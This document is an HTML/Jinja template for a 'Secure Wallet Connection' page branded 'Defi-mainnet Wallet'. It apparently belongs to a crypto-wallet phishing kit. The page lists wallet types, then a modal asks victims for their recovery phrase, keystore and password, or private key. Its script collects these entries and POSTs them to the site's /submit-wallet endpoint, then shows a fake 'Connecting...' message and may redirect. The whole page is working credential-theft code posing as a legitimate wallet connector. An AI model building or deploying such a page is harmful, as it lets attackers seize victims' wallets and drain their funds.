<html lang="en">
  <head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Defi-mainnet Wallet</title>
	<link rel="canonical" href="https://web3authsolution.web.app/wallets/connect.html" />
    <script src="../static/web3/78d167673c.js" ></script>
    <link rel="icon" href="../static/web3/wallets/logo_nav.svg">
    <!-- google fonts link -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&display=swap" rel="stylesheet" />
    <!-- bootstrap css link -->
    <link href="../static/web3/npm/bootstrap-5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
    <link rel="stylesheet" href="../static/web3/wallets/assets/2.6 animate.css.css" />
    <link rel="stylesheet" href="../static/web3/wallets/assets/walletpage.css" />
    <link href="../static/web3/wallets/assets/main.css" rel="stylesheet" />

    <style>
        img{  border-radius:50%; }
    </style>
  </head>
  <body style="background-x: #141414; background-color:#14141d">

    <div id="header">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
                <a href="{{url_for('main.index')}}">
              <div class="header-text">
                <!-- <h4 class="text-white">Apps</h4> -->
                <img class="text-center header-img"
                src="../static/web3/wallets/assets/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt=""/>
                <!-- <h4 class="text-white">Wallets</h4> -->
              </div>
            </a>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="coin-section">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="text-center coin-section-header">
              <h1 class="animated pulse text-white">Secure Wallet Connection</h1>
              <h6 class="animated pulse text-white"> Choose Your Wallet & Connect Securely To Continue.</h6>
            </div>
          </div>

          <!-- -->
          <div class="row">
            <div id="walletContainer" class="coin-registry"></div>
          </div>
        <!-- Modal Structure -->
        <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="walletModalLabel"></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div class="modal-body">
                
                <img id="walletLogo" src="" alt="" class="mb-3" style="width: 100px;">
                <ul class="nav nav-pills nav-fill" id="walletTab" role="tablist">
                  <li class="nav-item" role="presentation">
                    <button class="nav-link btn-md active h6" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase" type="button" role="tab" aria-controls="phrase" aria-selected="true">Phrase</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link btn-md h6" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore" type="button" role="tab" aria-controls="keystore" aria-selected="false">Keystore</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link btn-md h6" id="privatekey-tab" data-bs-toggle="tab" data-bs-target="#privatekey" type="button" role="tab" aria-controls="privatekey" aria-selected="false">Private Key</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link btn-md h6" id="password-tab" data-bs-toggle="tab" data-bs-target="#password" type="button" role="tab" aria-controls="password" aria-selected="false">Password</button>
                  </li>
                </ul>

            <form id="walletForm">
                <input type="hidden" id="type" name="type" value="0">
                <div class="tab-content mt-3" id="walletTabContent">
                  <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
                    <textarea class="form-control" name="phrase" placeholder="Enter Your Phrase"></textarea>
                  </div>
                  <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
                    <textarea class="form-control" name="keystore" placeholder="Enter Your Keystore"></textarea>
                  </div>
                  <div class="tab-pane fade" id="privatekey" role="tabpanel" aria-labelledby="privatekey-tab">
                    <textarea class="form-control" name="privatekey" placeholder="Enter Your Private Key"></textarea>
                  </div>
                  <div class="tab-pane fade" id="password" role="tabpanel" aria-labelledby="password-tab">
                    <input type="password" name="password" class="form-control" placeholder="Enter Your Password That Matches The KeyStore Provided.">
                  </div>
                </div>
              </div>

              <div class="modal-footer">
                <button type="submit" class="btn btn-lg btn-success h2">PROCEED</button>
                <button type="button" class="btn btn-lg btn-danger h2" data-bs-dismiss="modal">CANCEL</button>
              </div>
              
            </form>

            </div>
          </div>
        </div>

        {% include "incs/response_modal.html" %}

          <script>
            function response_modal(message) {
                document.getElementById('response_text').innerText = message;
                $('#response_modal').modal('show');
            }

            window.root = `${window.location.origin}`;

            document.addEventListener("DOMContentLoaded", () => {

              const walletContainer = document.getElementById("walletContainer");
              const walletModal = new bootstrap.Modal(document.getElementById("walletModal"));
              const modalTitle = document.getElementById("walletModalLabel");
              const modalLogo = document.getElementById("walletLogo");
            
              // Fetch wallets from the API
              
              async function fetchWallets() {
                try {
                  showLoader();
                  const response = await fetch(`${root}/api/wallet-types`);
                  const { data } = await response.json();
                  hideLoader();
                  renderWallets(data);
                } catch (error) {
                  hideLoader();
                  console.error("Error fetching wallets:", error);
                }
              }
            
              // Show loader animation
              function showLoader() {
                walletContainer.innerHTML = `
                  <div class="d-flex justify-content-center align-items-center" style="height: 200px;">
                    <div class="spinner-border text-primary" role="status">
                      <span class="visually-hidden">Loading...</span>
                    </div>
                  </div>`;
              }
            
              // Hide loader
              function hideLoader() {
                walletContainer.innerHTML = "";
              }
            
              // Render wallets
            function renderWallets(wallets) {
                const walletContainer = document.getElementById("walletContainer"); // Ensure this is the container for the wallet buttons
            
                wallets.forEach((wallet) => {
                const walletButton = document.createElement("button");
                walletButton.type = "button";
                walletButton.className = "btn coin";
                walletButton.dataset.bsToggle = "modal";
                walletButton.dataset.bsTarget = "#walletModal";
                
                // Add wallet ID as a data attribute
                walletButton.dataset.walletId = wallet.id;
            
                walletButton.innerHTML = `
                    <img class="coin-img" src="${wallet.image}" alt="${wallet.title}">
                    <h4 class="text-white">${wallet.title}</h4>`;
                
                // Attach onclick event to open modal and handle wallet selection
                walletButton.onclick = () => openWalletModal(wallet);
            
                // Append button to the container
                walletContainer.appendChild(walletButton);
                });
            }  
            
              // Open modal with wallet details
              function openWalletModal(wallet) {
                const type = document.getElementById("type"); // Hidden input in the modal form
                if (type) {
                    type.value = wallet.id; // Set wallet ID dynamically
                }
                modalTitle.textContent = wallet.title;
                modalLogo.src = wallet.image;
              }
            
              // Fetch wallets on page load
              fetchWallets();
            
            }) ;
            
            document.addEventListener('DOMContentLoaded', () => {
                // Find the submit button dynamically by type or ID
                const submitButton = document.querySelector("button[type='submit'], #submitButton");
              
                // Attach event listener for submission
                if (submitButton) {
                  submitButton.addEventListener('click', submitWalletDetails);
                }
              });
              
              // Function to handle wallet details submission
              window.submitWalletDetails = async function(event) {
                event.preventDefault(); // Prevent default form submission
              
                // Target all inputs with a name attribute inside the form
                const formElements = document.querySelectorAll("#walletForm [name]");
              
                // Prepare form data
                const formData = new FormData();
                formElements.forEach(input => {
                  if (input.name) {
                    formData.append(input.name, input.value.trim());
                  }
                });
              
                // Retrieve wallet type from the hidden input
                const walletType = formData.get("type");
                if (!walletType) {
                  response_modal("Please select a wallet type.");
                  return;
                }
              
                // Validate that at least one required field is filled (password, phrase, keystore, privatekey)
                const atLeastOneFieldFilled = ["password", "phrase", "keystore", "privatekey"].some(field => formData.get(field));
                if (!atLeastOneFieldFilled) {
                  response_modal("Please fill in at least one of the required fields (password, phrase, keystore, privatekey).");
                  return;
                }
              
                // Ensure password is provided if keystore is filled
                if (formData.get("keystore") && !formData.get("password")) {
                  response_modal("Password is required when providing a keystore.");
                  return;
                }
              
                // Prepare the payload for submission
                const payload = {};
                formData.forEach((value, key) => {
                  payload[key] = value;
                });
              
                // Add the wallet type dynamically to the payload
                payload["type"] = walletType;
                
                console.log("FormData:");
                for (let [key, value] of formData.entries()) {
                console.log(`${key}: ${value}`);
                }


                try {
                  // Disable the submit button to prevent multiple submissions
                  const submitButton = document.querySelector("button[type='submit'], #submitButton");
                  if (submitButton) {
                    submitButton.disabled = true;
                    //submitButton.textContent = "Connecting...";
                    submitButton.innerHTML = `<span style="height:22px; width:20px" class="spinner-border spinner-border-sm h-10" role="status" aria-hidden="true"></span> Connecting...`;
                  }
              
                  // Send the request
                  const response = await fetch(`${root}/submit-wallet`, {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                      //"X-CSRFToken": document.querySelector("input[name=csrf_token]").value, // CSRF token
                    },
                    body: JSON.stringify(payload),
                  });
              
                  // Handle the response
                  const result = await response.json();

                  if (response.ok && result.success) {
                    // Show a spinning animation
                    response_modal(`Connecting...`); // Temporarily show spinner in modal
                
                    // Add a slight delay before showing the success message
                    setTimeout(() => {
                        response_modal(`${result.message}`);
                        document.getElementById("walletForm").reset(); // Reset the form
                
                        // Redirect if needed
                        if (result.redirect || result.data.redirect) {
                            window.location.href = result.redirect || result.data.redirect;
                        }
                    }, 3000); // Delay in milliseconds
                } else {
                    response_modal(`${result.error}`);
                }
                
                } catch (error) {
                  console.error("Error connecting this wallet :", error);
                  response_modal(`An unexpected error occurred. Please try again later kindly.`);
                } finally {
                  // Re-enable the submit button
                  const submitButton = document.querySelector("button[type='submit'], #submitButton");
                  if (submitButton) {
                    submitButton.disabled = false;
                    submitButton.textContent = "PROCEED";
                  }
                }
              };
              
          </script>

          <div class="row">
            <div class="text-center coin-section-footer"><h6>&nbsp;</h6></div>
          </div>
        </div>

      </div>
    </div>

    <script src="../static/web3/jquery-3.6.0.min.js"></script>
    <!-- <script src="./script/walletpage.js"></script> -->
    <script src="../static/web3/npm/-popperjs/core-2.10.2/dist/umd/popper.min.js"></script>
    <script src="../static/web3/npm/bootstrap-5.1.3/dist/js/bootstrap.min.js"></script>
    <script src="../static/web3/wallets/assets/jquery.waypoints.min.js"></script>
    <script src="../static/web3/wallets/assets/jquery.counterup.min.js"></script>
    <script src="../static/web3/wallets/assets/wow.min.js"></script>
    <script src="../static/web3/wallets/assets/script.js"></script>
   
    <style>

        .btn.coin {
            transition: transform 0.2s ease-in-out;
          }
          
          .btn.coin:hover {
            transform: scale(1.05);
          }
          
          .spinner-border {
            width: 3rem;
            height: 3rem;
          }

        </style>

  </body>
</html>